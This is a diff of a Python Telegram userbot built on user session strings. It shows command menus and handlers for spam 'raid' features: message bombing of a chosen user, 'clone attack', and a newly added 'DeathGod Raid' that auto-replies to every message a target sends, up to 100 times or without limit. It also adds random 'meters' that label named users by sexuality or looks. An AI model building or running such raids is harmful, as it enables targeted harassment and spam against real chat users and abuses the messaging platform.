+                "║  ┌───〔 👻 𝐆𝐇𝐎𝐒𝐓 𝐌𝐎𝐃𝐄 〕───┐                         ║\n"
+                "║  │  `.ghost on` → Enable ghost mode (invisible)             ║\n"
+                "║  │  `.ghost off` → Disable ghost mode                       ║\n"
+                "║  └───────────────────────────────┘                          ║\n"
+                "║                                                              ║\n"
+                "║  ┌───〔 💣 𝐁𝐎𝐌𝐁 𝐒𝐘𝐒𝐓𝐄𝐌 〕───┐                       ║\n"
+                "║  │  `.bomb @user <count>` → Bomb user with messages         ║\n"
+                "║  │  `.stbomb @user` → Stop bombing user                     ║\n"
+                "║  └───────────────────────────────┘                          ║\n"
+                "║                                                              ║\n"
+                "║  ┌───〔 🧠 𝐌𝐈𝐍𝐃𝐅𝐔𝐂𝐊 𝐌𝐎𝐃𝐄 〕───┐                    ║\n"
+                "║  │  `.mindfuck on` → Enable mindfuck mode                   ║\n"
+                "║  │  `.mindfuck off` → Disable mindfuck                     ║\n"
+                "║  └───────────────────────────────┘                          ║\n"
+                "║                                                              ║\n"
+                "║  ┌───〔 🔇 𝐒𝐈𝐋𝐄𝐍𝐓 𝐊𝐈𝐋𝐋 〕───┐                       ║\n"
+                "║  │  `.silentkill @user` → Silently remove user's msgs       ║\n"
+                "║  │  `.ssilentkill @user` → Stop silent kill                 ║\n"
+                "║  └───────────────────────────────┘                          ║\n"
+                "║                                                              ║\n"
+                "║  ┌───〔 🌌 𝐕𝐎𝐈𝐃 𝐌𝐎𝐃𝐄 〕───┐                          ║\n"
+                "║  │  `.void @user` → Send user to void (hide all msgs)       ║\n"
+                "║  │  `.svoid @user` → Stop void mode                         ║\n"
+                "║  └───────────────────────────────┘                          ║\n"
+                "║                                                              ║\n"
+                "║  ┌───〔 🎯 𝐂𝐋𝐎𝐍𝐄 𝐀𝐓𝐓𝐀𝐂𝐊 〕───┐                    ║\n"
+                "║  │  `.clone @user <count>` → Clone user's messages          ║\n"
+                "║  │  `.sclone @user` → Stop clone attack                     ║\n"
+                "║  └───────────────────────────────┘                          ║\n"
+                "║                                                              ║\n"
+                "║  ┌───〔 💀 𝐃𝐄𝐀𝐓𝐇𝐍𝐎𝐓𝐄 〕───┐                         ║\n"
+                "║  │  `.deathnote @user <msg>` → Send death note              ║\n"
+                "║  │  `.sdeathnote @user` → Stop death note spam              ║\n"
+                "║  └───────────────────────────────┘                          ║\n"
+                "║                                                              ║\n"
+                "║  ┌───〔 🌪️ 𝐂𝐇𝐀𝐎𝐒 𝐌𝐎𝐃𝐄 〕───┐                       ║\n"
+                "║  │  `.chaos on` → Enable chaos mode                         ║\n"
+                "║  │  `.chaos off` → Disable chaos mode                       ║\n"
+                "║  └───────────────────────────────┘                          ║\n"
+                "║                                                              ║\n"
+                "║  ┌───〔 🖥️ 𝐇𝐀𝐂𝐊 𝐌𝐎𝐃𝐄 〕───┐                         ║\n"
+                "║  │  `.hack @user` → Start hack simulation                   ║\n"
+                "║  │  `.shack @user` → Stop hack simulation                   ║\n"
+                "║  └───────────────────────────────┘                          ║\n"
+                "║                                                              ║\n"
+                "║  ┌───〔 🦠 𝐕𝐈𝐑𝐔𝐒 𝐌𝐎𝐃𝐄 〕───┐                        ║\n"
+                "║  │  `.virus on` → Enable virus mode                         ║\n"
+                "║  │  `.virus off` → Disable virus mode                       ║\n"
+                "║  └───────────────────────────────┘                          ║\n"
+                "║                                                              ║\n"
+                "║  ┌───〔 🌑 𝐁𝐋𝐀𝐂𝐊𝐎𝐔𝐓 𝐌𝐎𝐃𝐄 〕───┐                   ║\n"
+                "║  │  `.blackout @user` → Blackout user's messages            ║\n"
+                "║  │  `.sblackout @user` → Stop blackout                      ║\n"
+                "║  └───────────────────────────────┘                          ║\n"
+                "║                                                              ║\n"
+                "║  📌 `.menu` → Main menu                                     ║\n"
                 "║                                                              ║\n"
                 "╚══════════════════════════════════════════════════════════════╝"
             )
@@ -1516,37 +1409,162 @@ async def run_user_bot(session_string, chat_id):
         async def cmd_menu7(event, _):
             menu = (
                 "╔══════════════════════════════════════════════════════════════╗\n"
-                "║            🎭 FUN METERS & MORE                             ║\n"
+                "║        🎭 𝐅𝐔𝐍 𝐅𝐄𝐀𝐓𝐔𝐑𝐄𝐒 (𝐏𝐀𝐑𝐓 𝟒 - 𝐅𝐔𝐍 𝐌𝐄𝐓𝐄𝐑)        ║\n"
                 "╠══════════════════════════════════════════════════════════════╣\n"
-                "║  ┌───〔 📊 FUN METERS 〕───┐\n"
-                "║  │  .studmeter @user → Stud %                            ║\n"
-                "║  │  .looks @user → Looks %                               ║\n"
-                "║  │  .gay @user → Gay %                                   ║\n"
-                "║  │  .lesbian @user → Lesbian %                           ║\n"
-                "║  │  .straight @user → Straight %                         ║\n"
-                "║  │  .bi @user → Bi %                                     ║\n"
-                "║  │  .trans @user → Trans %                               ║\n"
-                "║  │  .simp @user → Simp %                                 ║\n"
-                "║  │  .chad @user → Chad %                                 ║\n"
-                "║  │  .friendly @user → Friendly %                         ║\n"
-                "║  │  .rizz @user → Rizz Meter (1-100)                    ║\n"
-                "║  │  .iq @user → IQ Score (1-200)                        ║\n"
-                "║  └───────────────────────────────┘\n"
-                "║  ┌───〔 💖 BEST FRIEND? 〕───┐\n"
-                "║  │  .bestfrnd @user → Ask with poetic style & buttons    ║\n"
-                "║  └───────────────────────────────┘\n"
-                "║  ┌───〔 💔 DIVORCE & 💍 MARRIAGE 〕───┐\n"
-                "║  │  .divorce @user → Ask with Yes/No buttons             ║\n"
-                "║  │  .marriage @user → Ask with Yes/No buttons            ║\n"
-                "║  └───────────────────────────────┘\n"
                 "║                                                              ║\n"
-                "║  📌 .menu → Main menu                                     ║\n"
+                "║  ┌───〔 📊 𝐒𝐓𝐔𝐃 𝐌𝐄𝐓𝐄𝐑 〕───┐                         ║\n"
+                "║  │  `.studmeter @user` → Show stud percentage              ║\n"
+                "║  └───────────────────────────────┘                          ║\n"
+                "║                                                              ║\n"
+                "║  ┌───〔 👀 𝐋𝐎𝐎𝐊𝐒 𝐌𝐄𝐓𝐄𝐑 〕───┐                       ║\n"
+                "║  │  `.looks @user` → Show looks percentage                  ║\n"
+                "║  └───────────────────────────────┘                          ║\n"
+                "║                                                              ║\n"
+                "║  ┌───〔 🏳️‍🌈 𝐆𝐀𝐘 % 〕───┐                              ║\n"
+                "║  │  `.gay @user` → Show gay percentage                      ║\n"
+                "║  └───────────────────────────────┘                          ║\n"
+                "║                                                              ║\n"
+                "║  ┌───〔 👩‍❤️‍👩 𝐋𝐄𝐒𝐁𝐈𝐀𝐍 % 〕───┐                        ║\n"
+                "║  │  `.lesbian @user` → Show lesbian percentage              ║\n"
+                "║  └───────────────────────────────┘                          ║\n"
+                "║                                                              ║\n"
+                "║  ┌───〔 👑 𝐁𝐀𝐃𝐃𝐈𝐄 / 𝐏𝐎𝐊𝐊𝐈𝐄 / 𝐒𝐈𝐆𝐌𝐀 〕───┐              ║\n"
+                "║  │  `.baddie @user` → Show Baddie percentage               ║\n"
+                "║  │  `.pokkie @user` → Show Pokkie percentage               ║\n"
+                "║  │  `.sigma @user` → Show Sigma percentage                  ║\n"
+                "║  └───────────────────────────────┘                          ║\n"
+                "║                                                              ║\n"
+                "║  ┌───〔 💖 𝐁𝐄𝐒𝐓 𝐅𝐑𝐈𝐄𝐍𝐃? 〕───┐                      ║\n"
+                "║  │  `.bestfrnd @user` → Ask in poetic style with buttons    ║\n"
+                "║  │  (only the target user can press the buttons)            ║\n"
+                "║  └───────────────────────────────┘                          ║\n"
+                "║                                                              ║\n"
+                "║  ┌───〔 💔 𝐃𝐈𝐕𝐎𝐑𝐂𝐄 & 💍 𝐌𝐀𝐑𝐑𝐈𝐀𝐆𝐄 〕───┐            ║\n"
+                "║  │  `.divorce @user` → Ask with Yes/No buttons (only target)║\n"
+                "║  │  `.marriage @user` → Ask with Yes/No buttons (only target)║\n"
+                "║  └───────────────────────────────┘                          ║\n"
+                "║                                                              ║\n"
+                "║  📌 `.menu` → Main menu                                     ║\n"
                 "║                                                              ║\n"
                 "╚══════════════════════════════════════════════════════════════╝"
             )
             await safe_edit(event, menu)
 
-        # ─── FUN METERS ───
+        # ─── BADDIE / POKKIE / SIGMA COMMANDS ───
+        @register_cmd("baddie")
+        async def cmd_baddie(event, arg):
+            target = await get_targets(event, arg)
+            if not target:
+                return await safe_edit(event, "❌ Reply to a user or provide username.")
+            uid = next(iter(target))
+            try:
+                user = await user_bot.get_entity(uid)
+                name = user.first_name or str(uid)
+                percent = random.randint(0, 100)
+                msg = f"👑 **Baddie Meter for {name}**\n\n💅 Baddie Level: {percent}%\n"
+                if percent >= 90:
+                    msg += "🔥 You're a queen/king! 💅✨"
+                elif percent >= 70:
+                    msg += "🌟 Pretty baddie! 😎"
+                elif percent >= 50:
+                    msg += "😏 Average baddie, could be better."
+                else:
+                    msg += "😬 Try harder! 💪"
+                await safe_edit(event, msg)
+            except:
+                await safe_edit(event, "❌ User not found.")
+
+        @register_cmd("pokkie")
+        async def cmd_pokkie(event, arg):
+            target = await get_targets(event, arg)
+            if not target:
+                return await safe_edit(event, "❌ Reply to a user or provide username.")
+            uid = next(iter(target))
+            try:
+                user = await user_bot.get_entity(uid)
+                name = user.first_name or str(uid)
+                percent = random.randint(0, 100)
+                msg = f"🍭 **Pokkie Meter for {name}**\n\n🍬 Pokkie Level: {percent}%\n"
+                if percent >= 90:
+                    msg += "🍭 Ultimate Pokkie! 😍"
+                elif percent >= 70:
+                    msg += "🍬 Sweet Pokkie! 😊"
+                elif percent >= 50:
+                    msg += "😐 Kinda Pokkie."
+                else:
+                    msg += "😅 Not so Pokkie."
+                await safe_edit(event, msg)
+            except:
+                await safe_edit(event, "❌ User not found.")
+
+        @register_cmd("sigma")
+        async def cmd_sigma(event, arg):
+            target = await get_targets(event, arg)
+            if not target:
+                return await safe_edit(event, "❌ Reply to a user or provide username.")
+            uid = next(iter(target))
+            try:
+                user = await user_bot.get_entity(uid)
+                name = user.first_name or str(uid)
+                percent = random.randint(0, 100)
+                msg = f"🐺 **Sigma Meter for {name}**\n\n⚡ Sigma Level: {percent}%\n"
+                if percent >= 90:
+                    msg += "🐺 Sigma Male/Female! 💪"
+                elif percent >= 70:
+                    msg += "🌟 Pretty Sigma! 😎"
+                elif percent >= 50:
+                    msg += "😐 Average Sigma."
+                else:
+                    msg += "😅 Need more grind."
+                await safe_edit(event, msg)
+            except:
+                await safe_edit(event, "❌ User not found.")
+
+        # ─── DEATHGOD COMMANDS ───
+        @register_cmd("deathgod", needs_reply=True)
+        async def cmd_deathgod(event, arg):
+            """☠️ DeathGod Raid - Reply to user or mention them"""
+            targets = await get_targets(event, arg)
+            if not targets:
+                return await safe_edit(event, "❌ Reply to a user or provide username.")
+            
+            count = None
+            if arg:
+                parts = arg.strip().split()
+                if parts and parts[-1].isdigit():
+                    count = int(parts[-1])
+                    if count < 1: count = 1
+                    if count > 100: count = 100
+            
+            if not deathgod_list:
+                return await safe_edit(event, "❌ DeathGod list is empty!")
+            
+            added = []
+            for uid in targets:
+                user_bot.shayari_raid[uid] = count
+                display = "∞" if count is None else f"{count} times"
+                added.append(f"{uid} ({display})")
+            
+            await safe_edit(event, f"☠️ **DeathGod Raid started** for {', '.join(added)}")
+
+        @register_cmd("sdeathgod")
+        async def cmd_sdeathgod(event, arg):
+            """🛑 Stop DeathGod Raid"""
+            targets = await get_targets(event, arg)
+            if not targets:
+                user_bot.shayari_raid.clear()
+                return await safe_edit(event, "🛑 DeathGod raid stopped for all")
+            removed = []
+            for uid in targets:
+                if uid in user_bot.shayari_raid:
+                    del user_bot.shayari_raid[uid]
+                    removed.append(str(uid))
+            if removed:
+                await safe_edit(event, f"🛑 Removed DeathGod for: {', '.join(removed)}")
+            else:
+                await safe_edit(event, "⚠️ No active DeathGod for these users")
+
+        # ─── FUN COMMANDS ───
         @register_cmd("studmeter")
         async def cmd_studmeter(event, arg):
             target = await get_targets(event, arg)
@@ -1639,191 +1657,6 @@ async def run_user_bot(session_string, chat_id):
             except:
                 await safe_edit(event, "❌ User not found.")
 
-        @register_cmd("straight")
-        async def cmd_straight(event, arg):
-            target = await get_targets(event, arg)
-            if not target:
-                return await safe_edit(event, "❌ Reply to a user or provide username.")
-            uid = next(iter(target))
-            try:
-                user = await user_bot.get_entity(uid)
-                name = user.first_name or str(uid)
-                percent = random.randint(0, 100)
-                msg = f"💪 **Straight Percentage for {name}**\n\n📏 Straightness: {percent}%\n"
-                if percent >= 90:
-                    msg += "🏆 Straight as a ruler! 📏"
-                elif percent >= 70:
-                    msg += "😎 Pretty straight! 😏"
-                elif percent >= 50:
-                    msg += "🤷 Could be flexible!"
-                else:
-                    msg += "🌈 Maybe try exploring? 😉"
-                await safe_edit(event, msg)
-            except:
-                await safe_edit(event, "❌ User not found.")
-
-        @register_cmd("bi")
-        async def cmd_bi(event, arg):
-            target = await get_targets(event, arg)
-            if not target:
-                return await safe_edit(event, "❌ Reply to a user or provide username.")
-            uid = next(iter(target))
-            try:
-                user = await user_bot.get_entity(uid)
-                name = user.first_name or str(uid)
-                percent = random.randint(0, 100)
-                msg = f"💜 **Bi Percentage for {name}**\n\n💕 Bisexuality: {percent}%\n"
-                if percent >= 90:
-                    msg += "💜💙 Totally bi! 😍"
-                elif percent >= 70:
-                    msg += "💕 Quite bi-curious! 😏"
-                elif percent >= 50:
-                    msg += "🤷‍♂️ Could go both ways!"
-                else:
-                    msg += "💁 Mostly straight!"
-                await safe_edit(event, msg)
-            except:
-                await safe_edit(event, "❌ User not found.")
-
-        @register_cmd("trans")
-        async def cmd_trans(event, arg):
-            target = await get_targets(event, arg)
-            if not target:
-                return await safe_edit(event, "❌ Reply to a user or provide username.")
-            uid = next(iter(target))
-            try:
-                user = await user_bot.get_entity(uid)
-                name = user.first_name or str(uid)
-                percent = random.randint(0, 100)
-                msg = f"🏳️‍⚧️ **Trans Pride for {name}**\n\n💖 Transness: {percent}%\n"
-                if percent >= 90:
-                    msg += "🌟 You're a beautiful soul! 💕"
-                elif percent >= 70:
-                    msg += "💜 Very strong! 😊"
-                elif percent >= 50:
-                    msg += "🤔 Exploring your identity?"
-                else:
-                    msg += "💁 You're you, that's enough!"
-                await safe_edit(event, msg)
-            except:
-                await safe_edit(event, "❌ User not found.")
-
-        @register_cmd("simp")
-        async def cmd_simp(event, arg):
-            target = await get_targets(event, arg)
-            if not target:
-                return await safe_edit(event, "❌ Reply to a user or provide username.")
-            uid = next(iter(target))
-            try:
-                user = await user_bot.get_entity(uid)
-                name = user.first_name or str(uid)
-                percent = random.randint(0, 100)
-                msg = f"🫠 **Simp Meter for {name}**\n\n😩 Simp Level: {percent}%\n"
-                if percent >= 90:
-                    msg += "💀 Ultimate Simp! 😂"
-                elif percent >= 70:
-                    msg += "💔 Down bad! 😭"
-                elif percent >= 50:
-                    msg += "😅 Slightly simping!"
-                else:
-                    msg += "👑 You're a chad! 😎"
-                await safe_edit(event, msg)
-            except:
-                await safe_edit(event, "❌ User not found.")
-
-        @register_cmd("chad")
-        async def cmd_chad(event, arg):
-            target = await get_targets(event, arg)
-            if not target:
-                return await safe_edit(event, "❌ Reply to a user or provide username.")
-            uid = next(iter(target))
-            try:
-                user = await user_bot.get_entity(uid)
-                name = user.first_name or str(uid)
-                percent = random.randint(0, 100)
-                msg = f"🗿 **Chad Meter for {name}**\n\n💪 Chad Level: {percent}%\n"
-                if percent >= 90:
-                    msg += "🔥 Sigma Chad! 😎"
-                elif percent >= 70:
-                    msg += "💪 Pretty chad! 💪"
-                elif percent >= 50:
-                    msg += "🤷 Neutral vibes!"
-                else:
-                    msg += "🥶 Maybe a bit of a beta? 😉"
-                await safe_edit(event, msg)
-            except:
-                await safe_edit(event, "❌ User not found.")
-
-        @register_cmd("friendly")
-        async def cmd_friendly(event, arg):
-            target = await get_targets(event, arg)
-            if not target:
-                return await safe_edit(event, "❌ Reply to a user or provide username.")
-            uid = next(iter(target))
-            try:
-                user = await user_bot.get_entity(uid)
-                name = user.first_name or str(uid)
-                percent = random.randint(0, 100)
-                msg = f"🤗 **Friendliness Meter for {name}**\n\n😊 Friendly: {percent}%\n"
-                if percent >= 90:
-                    msg += "🌈 You're a ray of sunshine! ☀️"
-                elif percent >= 70:
-                    msg += "💖 Very approachable! 😊"
-                elif percent >= 50:
-                    msg += "😐 Pretty neutral!"
-                else:
-                    msg += "😤 Maybe need to smile more?"
-                await safe_edit(event, msg)
-            except:
-                await safe_edit(event, "❌ User not found.")
-
-        @register_cmd("rizz")
-        async def cmd_rizz(event, arg):
-            target = await get_targets(event, arg)
-            if not target:
-                return await safe_edit(event, "❌ Reply to a user or provide username.")
-            uid = next(iter(target))
-            try:
-                user = await user_bot.get_entity(uid)
-                name = user.first_name or str(uid)
-                percent = random.randint(0, 100)
-                msg = f"💋 **Rizz Meter for {name}**\n\n🔥 Rizz Level: {percent}%\n"
-                if percent >= 90:
-                    msg += "🌹 Absolute rizz god! 😏"
-                elif percent >= 70:
-                    msg += "💕 Smooth talker! 😉"
-                elif percent >= 50:
-                    msg += "😅 Average rizz!"
-                else:
-                    msg += "🤡 Need some rizz lessons? 😂"
-                await safe_edit(event, msg)
-            except:
-                await safe_edit(event, "❌ User not found.")
-
-        @register_cmd("iq")
-        async def cmd_iq(event, arg):
-            target = await get_targets(event, arg)
-            if not target:
-                return await safe_edit(event, "❌ Reply to a user or provide username.")
-            uid = next(iter(target))
-            try:
-                user = await user_bot.get_entity(uid)
-                name = user.first_name or str(uid)
-                score = random.randint(50, 200)
-                msg = f"🧠 **IQ Score for {name}**\n\n📊 IQ: {score}\n"
-                if score >= 180:
-                    msg += "🌟 Genius level! 🤯"
-                elif score >= 140:
-                    msg += "💡 Very smart! 🧐"
-                elif score >= 100:
-                    msg += "👍 Average, keep learning!"
-                else:
-                    msg += "😬 Maybe read a book? 😅"
-                await safe_edit(event, msg)
-            except:
-                await safe_edit(event, "❌ User not found.")
-
-        # ─── BESTFRIEND, MARRIAGE, DIVORCE ───
         @register_cmd("bestfrnd")
         async def cmd_bestfrnd(event, arg):
             target = await get_targets(event, arg)
@@ -1831,42 +1664,15 @@ async def run_user_bot(session_string, chat_id):
                 return await safe_edit(event, "❌ Reply to a user or provide username.")
             uid = next(iter(target))
             try:
-                requester = await user_bot.get_me()
-                requester_name = requester.first_name or "Someone"
-                target_user = await user_bot.get_entity(uid)
-                target_name = target_user.first_name or "Unknown"
-
-                shayari = random.choice(BESTFRIEND_SHAYARI)
-                final_msg = f"{shayari}\n\n**From:** {requester_name}\n**To:** {target_name}"
+                user = await user_bot.get_entity(uid)
+                name = user.first_name or str(uid)
+                shayari = f"❤️ *Dil ki baat kehni hai, sun lo meri jaan,*\n🌸 *Tum bin adhoori hai yeh dastaan.*\n💫 *Kya tum banogi/banoge meri best friend?* 🤗"
                 buttons = [
                     [types.KeyboardButtonCallback("💖 Haan, zaroor!", f"bestfrnd_yes_{uid}_{event.sender_id}")],
                     [types.KeyboardButtonCallback("💔 Nahi, sorry!", f"bestfrnd_no_{uid}_{event.sender_id}")]
                 ]
                 await event.delete()
-                await user_bot.send_message(event.chat_id, final_msg, buttons=buttons)
-            except:
-                await safe_edit(event, "❌ User not found.")
-
-        @register_cmd("marriage")
-        async def cmd_marriage(event, arg):
-            target = await get_targets(event, arg)
-            if not target:
-                return await safe_edit(event, "❌ Reply to a user or provide username.")
-            uid = next(iter(target))
-            try:
-                requester = await user_bot.get_me()
-                requester_name = requester.first_name or "Someone"
-                target_user = await user_bot.get_entity(uid)
-                target_name = target_user.first_name or "Unknown"
-
-                shayari = random.choice(MARRIAGE_SHAYARI)
-                final_msg = f"{shayari}\n\n**From:** {requester_name}\n**To:** {target_name}"
-                buttons = [
-                    [types.KeyboardButtonCallback("💍 Yes", f"marriage_yes_{uid}_{event.sender_id}")],
-                    [types.KeyboardButtonCallback("💔 No", f"marriage_no_{uid}_{event.sender_id}")]
-                ]
-                await event.delete()
-                await user_bot.send_message(event.chat_id, final_msg, buttons=buttons)
+                await user_bot.send_message(event.chat_id, f"🌸 {shayari}\n\n👤 **{name}**", buttons=buttons)
             except:
                 await safe_edit(event, "❌ User not found.")
 
@@ -1877,64 +1683,38 @@ async def run_user_bot(session_string, chat_id):
                 return await safe_edit(event, "❌ Reply to a user or provide username.")
             uid = next(iter(target))
             try:
-                requester = await user_bot.get_me()
-                requester_name = requester.first_name or "Someone"
-                target_user = await user_bot.get_entity(uid)
-                target_name = target_user.first_name or "Unknown"
-
-                shayari = random.choice(DIVORCE_SHAYARI)
-                final_msg = f"{shayari}\n\n**From:** {requester_name}\n**To:** {target_name}"
+                user = await user_bot.get_entity(uid)
+                name = user.first_name or str(uid)
+                shayari = f"💔 *Rishton ki dor hai kamzor,*\n🌪️ *Ab nahi sahega yeh dard-e-dil.*\n❓ *Kya tum talaq chahti ho/chahte ho?*"
                 buttons = [
                     [types.KeyboardButtonCallback("💔 Yes", f"divorce_yes_{uid}_{event.sender_id}")],
                     [types.KeyboardButtonCallback("💖 No, let's stay", f"divorce_no_{uid}_{event.sender_id}")]
                 ]
                 await event.delete()
-                await user_bot.send_message(event.chat_id, final_msg, buttons=buttons)
+                await user_bot.send_message(event.chat_id, f"💔 {shayari}\n\n👤 **{name}**", buttons=buttons)
             except:
                 await safe_edit(event, "❌ User not found.")
 
-        # ─── CALLBACK HANDLER ───
-        @user_bot.on(events.CallbackQuery)
-        async def userbot_callback(event):
-            data = event.data.decode()
-            clicker_id = event.sender_id
-            parts = data.split("_")
-            if len(parts) < 4:
-                return await event.answer("Invalid request.", alert=True)
-            action = parts[0]
-            target_id = int(parts[2])
-            requester_id = int(parts[3])
-            if clicker_id != target_id:
-                await event.answer("❌ This question is not for you!", alert=True)
-                return
+        @register_cmd("marriage")
+        async def cmd_marriage(event, arg):
+            target = await get_targets(event, arg)
+            if not target:
+                return await safe_edit(event, "❌ Reply to a user or provide username.")
+            uid = next(iter(target))
             try:
-                target = await user_bot.get_entity(target_id)
-                target_name = target.first_name or str(target_id)
-                requester = await user_bot.get_entity(requester_id)
-                requester_name = requester.first_name or str(requester_id)
-                if action == "bestfrnd_yes":
-                    await event.edit(f"💖 **{target_name}** said **YES** to be best friend with **{requester_name}**! 🎉\n\nDosti zindabad! 🤗")
-                    await event.answer("You accepted! 💖", alert=True)
-                elif action == "bestfrnd_no":
-                    await event.edit(f"💔 **{target_name}** said **NO** to be best friend with **{requester_name}**. 😢\n\nMaybe next time! 💔")
-                    await event.answer("You declined! 💔", alert=True)
-                elif action == "divorce_yes":
-                    await event.edit(f"💔 **{target_name}** said **YES** to divorce from **{requester_name}**. 😢\n\nIt's over. 💔")
-                    await event.answer("Divorce accepted! 💔", alert=True)
-                elif action == "divorce_no":
-                    await event.edit(f"💖 **{target_name}** said **NO** to divorce from **{requester_name}**. ❤️\n\nLove wins! 💕")
-                    await event.answer("Divorce rejected! ❤️", alert=True)
-                elif action == "marriage_yes":
-                    await event.edit(f"💍 **{target_name}** said **YES** to marry **{requester_name}**! 🎉\n\nCongratulations! 💕💍")
-                    await event.answer("Marriage accepted! 🎉", alert=True)
-                elif action == "marriage_no":
-                    await event.edit(f"💔 **{target_name}** said **NO** to marry **{requester_name}**. 😢\n\nMaybe next time! 💔")
-                    await event.answer("Marriage rejected! 💔", alert=True)
-            except Exception as e:
-                await event.edit("❌ Error processing your request.")
-                print(f"Callback error: {e}")
+                user = await user_bot.get_entity(uid)
+                name = user.first_name or str(uid)
+                shayari = f"💍 *Chand sitare sab hai gawah,*\n🌹 *Tum bin jeena hai saza.*\n💕 *Kya tum mujhse shaadi karogi/karoge?*"
+                buttons = [
+                    [types.KeyboardButtonCallback("💍 Yes", f"marriage_yes_{uid}_{event.sender_id}")],
+                    [types.KeyboardButtonCallback("💔 No", f"marriage_no_{uid}_{event.sender_id}")]
+                ]
+                await event.delete()
+                await user_bot.send_message(event.chat_id, f"💍 {shayari}\n\n👤 **{name}**", buttons=buttons)
+            except:
+                await safe_edit(event, "❌ User not found.")
 
-        # ─── RAID COMMANDS ───
+        # ─── REPLY, RR, FLAG, HRR, REPLYGOD, CUSTOMRAID ───
         @register_cmd("reply", needs_reply=True)
         async def cmd_reply(event, arg):
             targets = await get_targets(event, arg)
@@ -3499,15 +3279,20 @@ async def run_user_bot(session_string, chat_id):
                 return await safe_edit(event, "❌ Invalid. Use: .nc set <lang> <text>  or  .nc stop")
             action = parts[0].lower()
             if action == "stop":
-                user_bot.NC_STATE["active"] = False
-                if user_bot.NC_STATE.get("task") and not user_bot.NC_STATE["task"].done():
-                    user_bot.NC_STATE["task"].cancel()
-                    try:
-                        await user_bot.NC_STATE["task"]
-                    except asyncio.CancelledError:
-                        pass
-                user_bot.NC_STATE["task"] = None
-                await safe_edit(event, "🛑 Name Changer stopped.")
+                # Saare active userbots ka NC stop karo (Global fix)
+                stopped_count = 0
+                for uid, ub in active_userbots.items():
+                    if hasattr(ub, "NC_STATE"):
+                        ub.NC_STATE["active"] = False
+                        if ub.NC_STATE.get("task") and not ub.NC_STATE["task"].done():
+                            ub.NC_STATE["task"].cancel()
+                            try:
+                                await ub.NC_STATE["task"]
+                            except asyncio.CancelledError:
+                                pass
+                        ub.NC_STATE["task"] = None
+                        stopped_count += 1
+                await safe_edit(event, f"🛑 Name Changer stopped for {stopped_count} active userbot(s).")
                 return
             elif action == "set":
                 if len(parts) < 3:
@@ -3559,14 +3344,13 @@ async def run_user_bot(session_string, chat_id):
             if not sender:
                 return
 
-            # ── ALL COMMANDS require owner or admin ──
             if prefix == "!":
                 if sender not in OWNER_IDS:
                     await safe_edit(event, "❌ You are not the owner.")
                     return
             else:
                 if sender not in OWNER_IDS and sender not in user_bot.admins:
-                    await safe_edit(event, "@zyrex_x_aetherbot use kro ye sab use krna hai toh")
+                    await safe_edit(event, "@ _x_aetherbot use krlo mst userbot hai")
                     return
                 if cmd in owner_only_commands and sender not in OWNER_IDS:
                     await safe_edit(event, "❌ Owner only command")
@@ -3660,8 +3444,8 @@ async def run_user_bot(session_string, chat_id):
                         user_bot.reply_cooldowns[sender] = now
                 if sender in user_bot.shayari_raid:
                     remaining = user_bot.shayari_raid[sender]
-                    if now - user_bot.reply_cooldowns.get(sender, 0) >= 1.5:
-                        await safe_send(chat, random.choice(shayari_texts), reply_to=event.id)
+                    if now - user_bot.reply_cooldowns.get(sender, 0) >= 1.0:
+                        await safe_send(chat, random.choice(deathgod_list), reply_to=event.id)
                         user_bot.reply_cooldowns[sender] = now
                         if remaining is not None:
                             if remaining > 1:
@@ -3771,10 +3555,7 @@ async def run_user_bot(session_string, chat_id):
         except:
             pass
 
-# ─── WEB SERVER ───
-from flask import Flask
-import threading
-
+# ─── WEB SERVER FOR RENDER (KEEP-ALIVE) ───
 app = Flask(__name__)
 
 @app.route('/')
@@ -3786,22 +3567,9 @@ def run_web():
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
 
-# ─── MAIN ───
+threading.Thread(target=run_web, daemon=True).start()
+
+# ─── MAIN BOT STARTER ───
 if __name__ == "__main__":
     print("🚀 Main bot starting with Web Server...")
-
-    loop = asyncio.get_event_loop()
-    loop.run_until_complete(init_db())
-    loop.run_until_complete(init_cipher())
-
-    sessions = loop.run_until_complete(load_sessions())
-    for uid, sess_str in sessions.items():
-        try:
-            asyncio.create_task(run_user_bot_with_restart(sess_str, uid))
-            print(f"✅ Restored session for user {uid}")
-        except Exception as e:
-            print(f"❌ Failed to restore {uid}: {e}")
-            loop.run_until_complete(delete_session(uid))
-
-    threading.Thread(target=run_web, daemon=True).start()
     main_bot.run_until_disconnected()
